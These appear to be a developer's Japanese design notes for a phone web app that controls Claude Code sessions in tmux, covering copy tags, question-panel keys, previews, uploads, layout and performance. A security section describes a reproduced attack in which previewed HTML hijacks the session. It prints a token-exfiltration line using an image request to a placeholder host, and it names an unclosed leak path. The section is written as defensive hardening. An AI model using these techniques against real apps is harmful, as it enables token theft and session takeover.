  ⚠️ ②の入力欄を `opacity:0` や 1px 四方に潰すと **iOS は「見えていない」と見なして選択してくれない**
  （最初これで写らなかった）。画面の外へ出すだけにする。
  どちらも駄目なときは**リンクの字を選んだ状態にして**「長押しして『コピー』を選んでください」と言う。
  3つの道はいずれも、実際に貼り付けて中身が入ることを確かめてある。
- ⚠️ **指を置いているあいだは描き直さない**（`touching`）。画面は2秒ごとに丸ごと組み直すので、
  押そうとしていた札が指の下で消えると「押したのに何も起きない」になる。離して0.5秒で再開。
  離した合図が来ないことがあるので、3秒で必ず自分で戻す。
- ⚠️ 桁数は「画面を取りに行ったとき」に決まる。**起動直後は保存しておいた画面を先に出す**ので
  まだ分かっておらず、そのままだと繋ぎ直しが効かない（実装中に踏んだ）。分からないときは
  その場で測り直す（`paneCols || measureCols()`）。

### 合言葉（プロダクトキー）も同じ札で写せる（2026-08-24）

URLだけ写せても足りない。お客様にお渡しするのは**URLと合言葉の2点セット**で、
合言葉こそ手打ちすると間違える（`0` と `O`、`1` と `l`）。そこで**同じ札を合言葉にも付ける**。
リンクではないので下線は引かず、**薄く敷いて「ここが値」と見せる**（`.val`）。

拾い方は3通り。**普通の文章に札が生えないこと**を最優先にしている（ログやJSONが札だらけになると使えない）。

- **形で拾う**＝`TSUMIKI-A1B2-C3D4-E5F6`。大文字と数字4字以上のかたまりを、ハイフンで**3つ以上**
  つないだもの。2つまで（`CLAUDE-CODE`）は普通の言葉なので拾わない。
- **名前で拾う**＝「合言葉」「プロダクトキー」「パスワード」等の**決まった名前**が前に付いている値。
  `key:` `token:` のような普通の英単語は入れない（JSONやエラーログが全部当たってしまう）。
  囲いは `：` `=`／`「」` `『』`／`` ` ``（Claude は合言葉をバッククォートで囲んで書くことが多い）。
- **囲いも記号も無い言い方**＝「合言葉は SAMPLE47 です」。ここで文章まで拾うと
  「パスワードが 間違っています」に札が付くので、**半角6字以上のかたまり**に限る。
- 囲いが無いと値のうしろへ「です」「を」がくっつく（`SAMPLE47です`）。**半角で始まる値なら
  全角が出たところで切る**（`cutAtWide`）。日本語そのものの合言葉（『ひまわり』）は切らない。
- ⚠️ URL は末尾の `.` `,` を落とすが、**合言葉は落とさない**。`p@ssw0rd!` のように記号で終わる
  合言葉は珍しくないため（`RE_URL_TRIM` と `RE_VAL_TRIM` を分けてあるのはこのため）。
- ⚠️ URL と合言葉は**重なることがある**（URL の中の大文字の並び）。前から順に並べて、
  同じ場所から始まったら**長い方を採る**＝URL が勝つ（`findTargets` の最後）。
- ⚠️ URL を拾う字は **ASCII の URL 用の字だけ**にしてある。「空白以外」で拾うと
  `.../senya.html ／ 合言葉：SAMPLE47` の全角部分まで URL に飲み込んで、リンクが壊れる。

### Claude の発言まるごとを写す札は**やめた**（2026-08-24 に足して、同日に外した）

`⏺` のすぐ右に置いて、Claude が書いた文章をかたまりごと写せるようにしていた（端末が入れた
折り返しを戻して渡す）。**要らないと判断して外した。** 折り返しを戻す処理（`unwrapBlock`）ごと
消してある。URL・合言葉の札はそのまま残っている。

⚠️ もし将来また要るなら、**「戻しきれない」ことは分かっている**＝端末の文字だけが手がかりで
元の改行は失われているので、「貼ったあと目で見て直せる程度」が到達点だった。

### 札を出す判定を強くした（2026-08-24・2回目）

実画面4セッション2,056行を数えて、**写したいのに札が出ない**ものを潰した。
足すときの基準は一貫して「**普通の文章に札が生えないこと**を、拾える数より優先する」。

- **名前の付いていない合言葉**＝`SAMPLE47` `SAMPLEKEY7`（実画面に12回出ていた）。
  大文字英数8〜12字で、**英字と数字が両方入っているもの**だけ。
  英字だけ（`APPLESCRIPT`）・数字だけ（`20030112`）は弾く。前後がURLや16進の一部なら拾わない。
- **`https://` を省いたURL**＝`tools.tsumiki-apps.com/…`。ここは**行き先を絞る**のが肝で、
  「ドメインらしきもの」を拾うと `幅375px.jpeg` の `375px.jp` に札が付く（実際に出た）。
  `tsumiki-apps.com` と `*.github.io` に限定。開く先だけ `https://` を補い、**写す字は見えているまま**。
- ⚠️ **`⎿` の結果の枠は、端末の桁より狭い幅で折り返す**。桁だけを見ていたので、
  この中のURLが**7本切れたまま**だった（`https://fo` に札が付いていた）。
  枠ごとに「いちばん長い行」をその場の幅として使う（`wrapLimits`）。
- ⚠️ **表のマス目の中でも折り返す**。`│ … /ki │` の次の行に `│ bobako.html │` が落ちる。
  **区切り線（├─┼─┤）を挟まずに続く行＝前の行の続き**として繋ぐ。
  Claude の表は区切り線が毎行入るので、この見分けが成立する（3つの表で確認）。
- 表のマスにも札を出すようにした（それまで `textContent` で、**札が一切出ていなかった**）。
  さらに**見出しが「合言葉」なら、その列は中身まるごとが値**として札を出す
  （`SAMPLESHOP` のように英字だけで形から拾えないものも拾える）。
- **繋ぎ直せずに切れたままのURLには札を出さない**（`https://fo`）。ドメインに `.` と2字以上の
  末尾が無いものは、押しても開けない＝**ただの字のままのほうがまし**。
- 中身の無い例（説明文の `合言葉：◯◯`）にも出さない。
- ⚠️ **それでも取りこぼしは残る**。`…（ctrl+o to expand）` で畳まれた行のURLは、
  続きが画面に無いので戻せない（実画面に1本）。ここは原理的に無理。

## 質問パネル（AskUserQuestion）は「キー行で選ぶ」（2026-08-24・やり直しずみ）

Claude が「どれにしますか？」と聞くときのパネルは、**許可ダイアログとは別の作り**。
`Do you want to proceed?` は `╭─╮` の角丸の箱だが、質問パネルには外枠が無く、
タブの行で始まる。

```
←  ☐ 困りごと  ☐ 方針  ✔ Submit  →

│ つみきリモートで私の問い合わせに答えるとき…

❯ 1. 押せる選択肢が出ない
     角丸の箱が絵のまま出るだけで…
  4. Type something.
───────────────────────────────
  5. Chat about this

Enter to select · Tab/Arrow keys to navigate · Esc to cancel
```

`takeDialog()` は角丸の箱しか拾わないので、**この画面では選択肢が一つも読み取られて
いなかった**＝Kodai の「押しても選ばれない／複数選ぶと正しく選ばれない」の正体がこれ。

### 押す入口は**下のキー行ひとつだけ**

最初はパネルの行そのものをタップできるようにしたが、同日に**やめた**。
理由＝チャット欄の上のキー行（`esc pause ⏎ ↑ ↓ tab 1 2 3 4 5`）と入口が二重になり、
**キー行の 1〜5 が「あってもなくても同じ」**になってしまうため。どちらが正しい入口なのか
分からない画面は、押せる場所が多いほど迷う。

- **パネルは読むためのもの**（`#out .askp .dopt{pointer-events:none}`）。
  押せないのに `:active` で沈むと「押せた気がする」ので、当たり判定ごと切ってある。
- **選ぶのはキー行**。質問パネルが出ているあいだだけ、`1`〜`5` の意味が切り替わる。
- パネルの末尾には**番号の無い行**をひとつ足してある＝`pause`「いまは答えない」
  （2026-09-03）。番号の行と同じ形で見せて、押すのはキー行の `pause`。
  これも読むためだけの札で、色は付けない（色つきの枠は席の状態＝タブの縁のためにある）。

### キーの効き方（実機に tmux で送って測った・2026-08-24）

| 送ったもの | 起きること |
|---|---|
| 数字（`1`〜`5`） | **効くときと効かないときがある**。カーソルが自由記述の行（`Type something` / `Chat about this`）に乗っていると、数字はその入力欄に吸い込まれて選択が動かない |
| `↑` `↓` | **どの行に乗っていても必ず効く** |
| `Enter` | その行の決定。単一選択はそのまま次の質問へ進む。複数選択は入り／切りの切り替え |
| `Tab` `←` `→` | 質問のタブを移動。全部答えると「Review your answers」の確認画面になる |

だからキー行の `1`〜`5` は、質問パネルが出ているあいだ **文字の `1` を送らない**。
画面から `❯` の位置を読み、**目当ての行まで ↑↓ で歩かせてから Enter** を打つ（`askMove`）。
位置で決めるので、入力欄に焦点があっても外さない。

```
❯ 1. …   ← いま ❯ はここ（cur = 0）
  2. …
  3. …   ← キー行の「3」を押す = mv 2。差は 2 → Down Down Enter
```

- **`決定` のキーが増える**（`#kgo`）。複数選べる質問には番号の無い `Submit` の行が付くので、
  そこへ歩いて Enter を打つためのキー。**そのときだけ出る**。
- **その番号の選択肢が無いキーは沈める**（`.off`）。押しても「4 の選択肢はありません」と
  言うだけで、何も送らない。
- **番号は必ず出す**。複数選択は行頭がチェック箱に変わるが、番号が見えないとキー行から
  押せないので、チェック箱の左に番号を添える。
- 質問パネルが**出ていないとき**は、`1`〜`5` は今までどおり文字の `1` を送る
  （許可ダイアログはこれで確実に通る画面）。**角丸ダイアログの項目タップも今までどおり残す。**
- `❯` が読めないとき（履歴に流れた古いパネルなど）は**何も送らない**。間違った行を押すより、
  「Mac 側で操作してください」と言う方がまし。

### 実装の勘どころ

- `takeAskPanel()` … `←` で始まりタブの行に `Submit` を含む行から、下の案内
  （`Enter to select…`）までを1枚のパネルとして取る。
- **履歴の中の文字列に釣られないこと。** 撮った画面を貼り付けると、地の文に
  `←  ☒ … ✔ Submit  →` という**ただの文字列**が流れる。`⏺`（Claude の発言）や `⎿`
  （結果）が混じったら、そこで打ち切る。入れないと後ろ90行を丸ごと飲み込む（実際に踏んだ）。
- 選択肢とプレビューが左右に並ぶ形（2026-08-16 対応ぶん）は `takeSideBySide()` に任せる。
  本文の中にその形を見つけたら `takeAskPanel()` は手を引く。
- 押せるのは**一番下の枠だけ**。古いパネルには `done` が付き、`livePanel()` は null を返す
  ＝キー行は普通の数字送信に戻る。
- `syncKeys()` は画面を描き直すたびに呼ぶ。`決定` の出し入れと `.off` の付け外しはここ。

### 戻したいとき

読み取り（`takeAskPanel` / `askPanelEl`）は追加しただけで、既存の角丸ダイアログ・2段組の
処理には触っていない。キー行の切り替えをやめたいなら `livePanel()` が常に null を返すように
すれば、`1`〜`5` はすべて文字送信に戻る。

ヘッダーの **⋯ → 制作物を見る**。「もどる」でターミナルに戻る。

見る先は **iCloud Drive の `Kodai/00_Tsumiki`**（2026-08-14 に iCloud 直下の

分けてある。Mac からは `~/つみき出力/` がその近道（シンボリックリンク）。
iCloud なので **iPhone のファイルアプリからも開ける**。

- 一覧に出るのは見られる形式だけ（html / pdf / 画像 / md / txt / csv / json / svg）。
  xlsx・key・mp4 などはブラウザで開けないので出さない

- 認証は「**親が挨拶して**クッキーをもらい、あとはクッキー」（`HttpOnly` / `SameSite=Lax` /
  30日）。**枠に渡す URL には合言葉を付けない**（下の「砂箱の中で開く」を必ず読む）
- 置き場の外は出さない。`../` も絶対パスも、シンボリックリンクの飛び先も `realpath` で確認

### 画像は「全体が入る大きさ」で出す（2026-08-31）

画像も iframe に渡していたが、**iOS は画像を原寸で開く**。3200px の絵は左上の
ひとかけらだけが見えて、何の画像かも分からない。いまは画像だけ iframe を使わず、
アプリの中の `<img>` に出す。

- 既定は**全体が画面に入る大きさ**（`object-fit:contain`）
- **タップで原寸 ⇄ 全体**を行き来する。原寸のときは指でずらして細部を見る
- **写真に保存**（png/jpg/gif/webp のときだけ出る）＝ iOS の共有シートを開き、
  「画像を保存」で写真フォルダに入る。長押しの「写真に追加」も残してある
- ⚠️ 共有シートは**指で押した流れの中でしか開けない**。押してから画像を取りに行くと
  その流れが切れて iOS に断られるので、**開いた時点で先に落としておき**、
  押した瞬間は渡すだけにする。落とし終わる前に押されたら「読み込み中です」と出す
- 共有シートが無い端末（パソコンのブラウザ）は普通のダウンロードに落ちる

### プレビューは砂箱（sandbox）の中で開く（2026-09-02）

**外からもらった HTML をここに置いて開くと、開いただけで席に文字を打てた。**
検証用のしかけを作って実際に再現した：`parent.localStorage` から合言葉が読め、
`parent.fetch('/api/send', …)` が **http 200 で通り、tmux の席に文字が届いた**。
`/preview/` の文書に貼ってある CSP（`connect-src 'none'`）は**その文書“自身”の通信しか
止められない**ので、親の窓を経由されると素通しになる。

直すには**3つ同時**（どれか1つだけだと機能が欠ける）。

1. **枠に `sandbox="allow-scripts"`。`allow-same-origin` は付けない。**
   これで中の文書は「別の出どころ」になり、親の window・fetch・localStorage に手が届かない。
   ⚠️ **`allow-same-origin` を足したら、この防御は丸ごと無効になる。**
2. **枠と `<img>` の URL から `?t=`（合言葉）を外す。**
   砂箱の中でも自分の `location.href` は読めるので、URL に合言葉を入れると
   `new Image().src = 'https://どこか/?t=' + 合言葉` で外へ持ち出せる
   （通信の封じは fetch を止めるが、画像の読み込みも枠自身の移動も止められない）。
   かわりに**親が `/preview/`（パス無し）を合言葉つきで1回叩いて**クッキーをもらう
   （HttpOnly＝中から読めない、`Path=/preview/`＝`/api/` には付かない）。
3. **本文コピーの経路を付け替える。** 砂箱の中は覗けないので、親が元ファイルを取り直して
   `DOMParser` で字だけ抜く（`htmlToText`）。DOMParser は組み立てるだけで script を
   動かさないし、外部も読みに行かない＝しかけのある HTML でも安全に字が取れる。
   `<script>` `<style>` は落とす。コピーが両方の道で失敗したときの逃げ道も、
   枠の中を選ぶのではなく**この画面に選べる字を出す**（`#viewerpick`）形に変えた。

**実測（直す前 → 直したあと）**

| しかけが試したこと | 直す前 | 直したあと |
|---|---|---|
| 親の localStorage から合言葉 | 読めた | 読めない（SecurityError） |
| 親の fetch で席に送信 | **http 200・席に届いた** | 呼べない（SecurityError） |
| 文書自身の fetch | 止まった | 止まった |

**⚠️ PDF だけは砂箱を外す。** 砂箱に入った枠では**プラグインが一律で禁じられる**ので、
ブラウザ内蔵の PDF ビューアが動かず、PDF が開けなくなる（外す手立ては仕様に無い）。
PDF の中から親の画面に手が届く道は無いので、そこだけ外している。
**外してよいのは PDF のときだけ。** `openPreview` は開くたびに `if (PDF_RE…) 外す /
else 付ける` を**必ず両方**通るので、HTML が砂箱なしで開く道は残らない。
⚠️ **この `else` を消したら穴が開く。**

**⚠️ パソコンの Chrome では、制作物が別ファイルで持つ CSS と画像が出ない。**
砂箱の中は「別の出どころ」なので、**中の文書が自分で読みに行く CSS・画像に
Chrome はクッキーを付けない**（不透明な出どころは他人扱いになるため）。
**Safari（＝iPhone）では付くので出る**（実測で確認）。制作物は単一HTMLで作る決まりなので
実データ46件中1件しか該当しないが、Mac の Chrome で見たときだけ絵が割れる。
直すには、親が画像を `data:` に焼き直して `srcdoc` で渡す作りが要る（未実装）。

**⚠️ 残っている穴：同じ木の中の `.js` と `.css` は、しかけのある HTML から読めて外へ出せる。**
`<script src="他.js">` や `<link href="他.css">` で読み込んで、`<img src="https://外部/?…">`
で持ち出せる（CSP は fetch を止めるが、画像の読み込みは止めない）。
塞ぐには CSP に `img-src` を足すが、**外の画像を貼った制作物が表示できなくなる**ので
今は入れていない。席を操作される道は塞がっているので、被害は「置いてあるファイルが読まれる」まで。

### ⚠️ iCloud は必ず非同期で読む

`readdirSync` で読んだら **opendir が返ってこず、サーバーが丸ごと止まった**
（CPU 0%・ポートは LISTEN のまま・全機能が無応答）。iCloud 配下を触るコードは
**非同期＋制限時間（4秒）つき**にすること。1本のループで動くサーバーでは、
1回の停止が機能全体の停止になる。

以前はパスを文字として入力欄に流し込んでいたが、パスは70文字ほどあり、
1行の入力欄がそれだけで埋まって本文が見えなくなる。さらに本文を直そうとタップすると
カーソルがパスの中に落ち、Backspace でパスの末尾が欠ける → 送っても Claude 側は
「そんなファイルはない」になる（しかも欠けたことに気づけない）。札なら壊しようがない。

- 複数OK。**写真アプリで一度にまとめて選べる**（`<input multiple>`）。本文が空でも札があれば送れる
- PDF は「ファイルを選択」から。iCloud Drive の中のものもそのまま添えられる
- まとめて選んでも、**読み込みと送信は1件ずつ順番に**やる。同時に走らせると数MBの写真が
  何枚もメモリに乗ってスマホのブラウザが落ちる。札は選んだ瞬間に全部並び、置き終わった順に
  薄い表示が消えていく。20MB超は外して、最後の1行に「（20MB超の◯件は外しました）」と足す
  （外した知らせを別のトーストで先に出すと、置き終わりの知らせに上書きされて読めない）
- **PDF の札は絵にできない**ので `📄`（画像はサムネイル）。どちらも長押しでファイル名が出る
- 置き場は `~/.tsumiki-remote/uploads/`。**7日たったものは次の送信時に消す**
- 拡張子はファイル名ではなく中身（マジックバイト）で判定。画像でも PDF でもなければ弾く
- 上限20MB（画面側 `MAX_ATT` とサーバー側 `MAX_UPLOAD` の両方。**揃えること**）。
  中身は base64（約1.34倍）で届くので、受け取りの上限はそのぶん多め（32MB）
- iPhoneの写真は Safari が JPEG に変換して送ることが多い
- 札のサムネイルは canvas で120px に縮めたもの。元の写真そのままだと数MBあり、
  版が上がったときの「書きかけの預かり」（localStorage）に入らない

## 画面の幅（iPhone / iPad / PC）

**1つのCSSが伸縮する。幅ごとに別デザインは作らない。** ブレイクポイントは **600px と 900px の2本**。

| 幅 | かたち |
|---|---|
| 〜599（iPhone） | これまでどおり。詰まった寸法（端末の字 11px・キー行 31px） |
| 600〜（iPad 縦・小型ノート） | 1列のまま。端末の字 13px、押せる場所を 44px に広げる |
| 900〜（iPad 横・ノート・PC） | **セッションの札を左の列に立てる**。作業画面と入力欄は右 |

- 900px からは `body` を **grid** にして、HTML の並び（header→nav→#stale→main→footer）を
  升目に置き直すだけ。**入れ子は変えていない**＝DOM を触る JS は1行も直さなくていい
- 本文（`main`）と入力まわりは **max-width 1060px で中央寄せ**。1920px で1行が
  200文字を超えるのを防ぐ。**枠ごと**細くする（枠を端まで伸ばして中の字だけ寄せると、
  広い画面では黒い額縁の中に文が浮いて「読み込み中」に見える）
- ⚠️ **600px 以上の拡大には `min-height:600px` の条件が要る。** iPhone を横にすると
  844×390 のような「幅は広いが縦が無い」形になり、大きくしたぶん作業画面が潰れる
  （実測で 12px まで縮んだ・2026-08-31）
- ⚠️ 逆に**縦が 520px 以下のときは 600px から札を左の列に**する（`@media` のカンマ＝または）。
  横向きの iPhone は、横並びの札が消えるだけで作業画面が 72px → 165px 前後に戻る
- `manifest.json` の **`orientation` は `any`**。`portrait` だと、ホーム画面から起動した
  iPad が横にしても縦のままで、左右が黒く余る（2026-08-31 に直した）
- 外付けキーボードのときだけ **⌘Enter / Ctrl+Enter で送信**。Enter 単体は改行のまま
  （変換確定で飛んでいくため。2026-08-13 の決定はそのまま）
- 桁数の実測（`measureCols`）は **`#out` の余白を決め打ちにしない**。幅で 12px / 16px と
  変わるので、`getComputedStyle` で読む

**実測（2026-08-31）**：320 / 375 / 390 / 430 / 768 / 1024 / 1440 / 1920 のすべてで
横スクロール0・はみ出し0件。画面の写真は `~/つみき出力/つみきリモート_iPad対応_2026-08-31/`。
※ iPhone の幅（〜599px）の当たり判定は今までどおりで、44px に届かないボタンが残っている
（広げると狭い画面で作業画面が削られるため、意図して据え置き）。

## 速さと、止まったときの見せかた（2026-09-02）

点検で見つかった「遅い／止まっても分からない」をまとめて直した。**数字はすべて実測。**

### 起動と巡回

| どこ | 前 | 後 |
|---|---|---|
| アプリ本体の転送 | 164,895 B を毎回 | gzip **53,712 B**／変わっていなければ **304 で 0 B** |
| `/api/state`（席8つ） | 57.2 ms | **13.5 ms** |
| 席ループ（席6つ・tmux 12本） | 直列 40 ms | 同時実行 **9 ms** |
| 1周期の通信 | state を待って pane | **同時投げ**（往復が1回ぶん減る） |
| 送信→画面に出るまでの固定待ち | 250 ms に1回 | **120 / 450 ms**（画面だけ）＋ **1000 ms**（全部） |

- ⚠️ **キャッシュを効かせるのは静的ファイルの経路だけ。** `send()` は全部の返事に
  `no-store` を付けるが、それは `/api/` のためのもの。**席の状態を古い写しで見せたら嘘**
  になるので、`/api/` と `/manifest.json`（トークン入り）は `no-store` のまま。
  静的だけ `no-cache` ＋ ETag（mtime+size）＋ gzip にしてある。版（`currentVersion`）は
  中身の SHA1 だが、**計算し直す合図も mtime+size** なので、ETag と必ず一緒に変わる
- ⚠️ **`sw.js` は写しを作るとき `content-encoding` を外す。** fetch が受け取った時点で
  中身は展開ずみなのに札だけ残るので、そのまま写すと端末によっては読めなくなる
- **同じ席の画面は1周期に1回しか撮らない**（`captureScreenShared`・300msの写し）。
  一覧と作業画面が別々に撮っていたので、tmux が1本ムダで、しかも判定が食い違っていた。
  ⚠️ 撮っている最中に文字を送られたら、その撮影ぶんは**世代番号で捨てる**（そうしないと
  送信前の画面が「送信後の写し」として入り、札だけ1回ぶん古くなる）。
  ⚠️ **まとめて片付ける `/api/killmany` では写しを使わない**（消す直前の判定は必ず今の画面で）
- **1.5秒の巡回間隔は変えていない。** サーバー側は1周期40msしかなく、詰めても体感の主因
  ではない。むしろ `RESIZE_GRACE_MS`（2秒）に近づくと「iPhone と iPad で永久に作業中」の
  事故を招く。代わりに**送信直後だけ**見に行きを厚くしてある

### 止まったときに「止まった」と分かるようにする（3つで1組）

| どこ | 前 | 後 |
|---|---|---|
| 返事が来なくなってから帯が出るまで | iOS 任せで最大60秒 | **約6秒**（実測 5,959 ms） |
| 1席が返らないとき | 全体が止まる（締め切り無し） | その席だけ前の値にして**全体は返す** |
| 詰まったときの投げ足し | 1.5秒ごとに積み上がる | 前の巡回が終わるまで休む |

- ⚠️ **時間切れは読み取り（`/api/state` と `/api/pane`）だけ。** `api()` に一律で入れると、
  32MB の写真送信を殺し、Mac がもう受け取った送信を打ち切ることになる
- ⚠️ **見出しだけ届いて中身が来ない**止まり方がある。中身を読み終えてから時間切れを
  解除しないと、`r.json()` が永久に返らず、**帯も出ないまま画面が凍る**
- ⚠️ **「見に行け」の巡回（復帰・送信の直後・席を作った直後）は休ませない。**
  休ませると、出先で表に戻しても何も起きない時間ができる
- ⚠️ **万一この重なり防止の印を戻し損ねても、15秒で再開する。** 出先で二度と動かなく
  なるのが一番こわいので、逃げ道を必ず残す
- 締め切りは **席ごと1.2秒・一覧1.2秒・画面2.5秒**。⚠️ **巡回（1.5秒）より短くすること**。
  長いと「1席のつまりで全部が遅くなる」が残る
- **読めなかった席の札は薄くして「？」を添える**（`.tab.stale`）。前の値でしのいでいる
  ことが分かるようにする。**印を付けずに前の値を出すと、固まった席が「待機」のまま
  自信ありげに出続ける**＝直した意味が消える

### 取り違えと連打

- **返ってきた席名（`d.name`）を照らし合わせる。** 同時投げにしたぶん追い越しが起きやすく
  なるので対で入れた。席を切り替えた直後に前の席の画面が新しい席のものとして描かれ、
  写し（`panes`）にもその名前で入るのを止める
- **選択肢の二度押しを弾く。** 押しても画面が新しくなるのは 0.6〜1.5秒あと。その間に
  もう一度押すと **Enter がもう1本飛び、閉じた後の次の質問を勝手に決める**
  （取り消せない。実測で Enter が3本飛んだ）。
  **強さは質問の種類で変える：**

  | 質問 | 見分けかた | 止めかた |
  |---|---|---|
  | 1つだけ選ぶ | 「決定（Submit）」の行が**無い** | 1回押したら、その枠は**どの番号も**止める |
  | 複数選べる | 「決定（Submit）」の行が**ある**（`dataset.multi`） | **止めない** |
  | 許可ダイアログ（`╭─╮`） | 必ず1つだけ選ぶ | 押したら**枠ごと**止める |

  ⚠️ **1つだけ選ぶ質問で「違う番号」を押すほうが、同じ番号より危ない。** 一本目の Enter で
  質問が閉じたあとだと、↑↓ と Enter が**素のプロンプト**に飛ぶ。Claude Code の入力欄で
  ↑↓ は**履歴めくり**なので、前に打った指示をそのまま再送信しかねない。
  ⚠️ **複数選べる質問は止めない。** 1→2→3 と続けて押すのも、同じ番号をもう一度押して
  **チェックを外す**のも正規の操作で、枠は閉じないため。
  ⚠️ **許可ダイアログは押したボタンだけ止めても足りない**（「1」の直後に「2」で同じ事故）。
  ⚠️ **送れなかったら錠を外す。** 外さないと圏外で1回押しただけで数秒押し直せず、
  しかも「送っています」と嘘を言うことになる。画面が動かないままのときも時間で解ける

## 版（アプリの更新）

**ホーム画面アプリは一度開くと開きっぱなしになる。** Mac 側でこのアプリを直しても、
iPhone は前の画面を動かし続けるので、ボタンを押しても古い動きをする
（2026-08-11：削除済みの `/api/kill` を呼び続けて「押しても何も起きない」になった）。

- 版 ＝ **サーバー起動ごとの通し番号（BOOT）＋ `public/index.html` の中身のハッシュ**。
  `/api/state` で配り、画面は版が変わったら自分で読み込み直す
- 読み込み直す前に**入力欄の書きかけを預けて、開き直したあと戻す**
- 手動の逃げ道は **画面右上の ↻**（いまの版は ⋯ の見出しに出る）
- ファイルを touch しただけ（中身が同じ）では版は変わらない
- ⚠️ **版に `server.js` を混ぜない**（2026-08-12）。保存した瞬間に版は変わるが、
  動いているサーバーは再起動するまで古いまま＝その読み直しは何も新しくならない。
  サーバー側の変更が効くのは再起動したときなので、そこは BOOT が受け持つ
- ⚠️ **版が変わった瞬間には読み直さない**（2026-08-12）。直している最中は
  ファイルが何度も保存され、そのたびに開き直して画面がガタガタ切り替わる。
  版が **8秒**同じままになった＝手が止まった、と分かってから1回だけ読み直す
- ⚠️ **古い画面はこの仕組みを持っていない**。仕込む前に開いた画面は、
  一度だけ手で開き直す（アプリスイッチャーから上スワイプで終了 → 開き直し）
